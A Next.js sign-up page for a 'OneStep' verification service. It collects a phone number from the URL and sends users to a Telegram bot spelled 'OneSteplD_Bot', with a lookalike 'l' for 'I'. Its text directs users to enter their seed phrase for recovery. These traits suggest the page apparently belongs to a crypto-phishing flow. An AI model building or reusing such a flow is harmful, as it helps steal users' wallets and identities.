'use client';
import React from 'react';
import Image from 'next/image';
import Link from 'next/link';

import { useSearchParams, useRouter } from 'next/navigation';
import { requestOtp } from '@/app/api/authApi';

const Page = () => {
  const router = useRouter();

  const params = useSearchParams();
  const phone = params.get('phone');

  console.log('phone', phone);

  const telegramUrl = `https://t.me/OneSteplD_Bot?start=link_${phone}`;

  const handleTelegramClick = async () => {
    if (!phone) {
      alert('Phone number missing.');
      return;
    }

    try {
      // 1. Call backend to request OTP
      await requestOtp(phone);
      localStorage.setItem('phone', phone);

      // 2. Open Telegram bot link in a new tab
      window.open(telegramUrl, '_blank');

      // 3. Redirect to OTP verification page in current tab
      router.push(`/verification?phone=${encodeURIComponent(phone)}`);
    } catch {
      // Error handling is done in requestOtp
    }
  };

  return (
    <>
      {/* Brand Logo */}
      <div className="bg-green-80 grid grid-cols-3 items-center px-4 py-2 my-4">
        {/* Left text */}
        <Link href="/login">
          <div className="text-base font-bold tracking-widest text-white px-4 py-1 max-sm:text-xs cursor-pointer hover:underline">
            Back to Login
          </div>
        </Link>

        {/* Center text */}
        <div className="justify-self-center text-base font-bely font-bold tracking-widest bg-gradient-to-r from-white to-purple-500 bg-clip-text text-transparent px-4 py-1 rounded-xl shadow-md max-sm:text-xs">
          ONESTEP
        </div>

        {/* Right text */}
        <div className="justify-self-end text-base font-bold tracking-widest text-white px-4 py-1">
          X
        </div>
      </div>

      <div className="w-4/5   sm:w-4/5 md:w-3/4 lg:w-2/3 xl:w-3/5 2xl:w-3/5 mx-auto rounded-2xl shadow-2xl  relative  mt-12 max-sm:mb-4">
        <div className="w-full  rounded-2xl shadow-2xl p-8 pb-12 text-center border-2 border-gray-600 relative md:px-16 lg:px-24 xl:px-32 2xl:px-60">
          {/* Login Heading */}
          <div>
            <h2 className="mt-4 text-5xl font-normal text-white mb-2 font-bely tracking-wide pb-2">
              Sign up
            </h2>
            <p className="text-xl font-normal text-gray-300 mb-4 text-center font-bely ">
              Complete Onestep verification
            </p>

            {/* Sub instructions */}

            <div className="mb-6 text-gray-400 text-sm divide-amber-50 divide-y-2">
              Complete the OneStep verification to proceed. If you don&apos;t
              have one already. It is important for account verification
            </div>
          </div>

          <div className="mb-6 font-semibold text-gray-200 text-lg mt-8">
            KINDLY SELECT A MESSENGER
          </div>

          {/* Telegram Button */}
          <button
            className="w-15 h-15 flex items-center justify-center bg-yellow-400 hover:bg-yellow-300 transition-all rounded-2xl shadow-lg mx-auto mb-3"
            onClick={handleTelegramClick}
            title="Login via Telegram"
          >
            <Image
              width={10}
              height={10}
              src="/tele.svg"
              alt="Telegram"
              className="w-10 h-10"
            />
          </button>
          <div className="text-md text-white mb-1 text-center mt-8">
            Having trouble using OneStep Verification?
          </div>
          <button className="w-full bg-gradient-to-r from-yellow-600 via-yellow-300 to-yellow-600 text-black font-bold py-2 rounded-lg mb-3 text-base hover:from-yellow-300 hover:to-yellow-400 transition-all">
            HELP CENTRE
          </button>
          <p className="text-xs text-gray-300">
            If you have not yet registered for the Onestep ID. go to the
            recovery center to use the Seed phrase recovery with your seed
            phrase to gain access into your account
          </p>
        </div>
      </div>

      {/* /////////////////////////////////////////////////////////////////////////////////////////////////////////// */}

      <div className="text-md text-white mb-1 text-center mt-8">
        By using Login you agree to our{' '}
        <a href="#" className="text-yellow-600 underline hover:text-purple-200">
          Terms &amp; Privacy Policy.
        </a>
      </div>
    </>
  );
};

export default Page;
